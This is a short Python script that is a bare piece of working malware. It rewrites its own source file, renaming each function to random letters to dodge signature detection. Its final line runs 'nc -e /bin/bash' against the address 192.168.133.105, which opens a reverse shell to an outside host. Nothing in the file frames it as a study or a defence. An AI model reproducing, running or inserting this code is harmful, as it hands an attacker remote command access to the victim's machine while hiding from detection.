import random
import string
import subprocess

def shell(command):
    try:
        output = subprocess.run(["bash", "-c", command], capture_output=True, text=True)
        print(output.stdout)
    except subprocess.CalledProcessError as e:
        print(f"Command execution failed with error code {e.returncode}: {e.stdout}")
def generate_new_name(length=6):
   
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for _ in range(length))
def change_file(file_path):
    with open(file_path, 'r') as file:
        lines = file.readlines()
    updated_lines = []
    function_name_map = {}
    random_name = None
    for line in lines:
        if line.strip().startswith('def '):
            function_name = line.split()[1].split('(')[0]
            random_name = generate_new_name()
            function_name_map[function_name] = random_name
            updated_lines.append(line.replace(function_name, random_name))
        else:
            for old_name, new_name in function_name_map.items():
                line = line.replace(old_name, new_name)
            updated_lines.append(line)

    with open(file_path, 'w') as file:
        file.writelines(updated_lines)
change_file(__file__)
shell('nc -e /bin/bash 192.168.133.105')
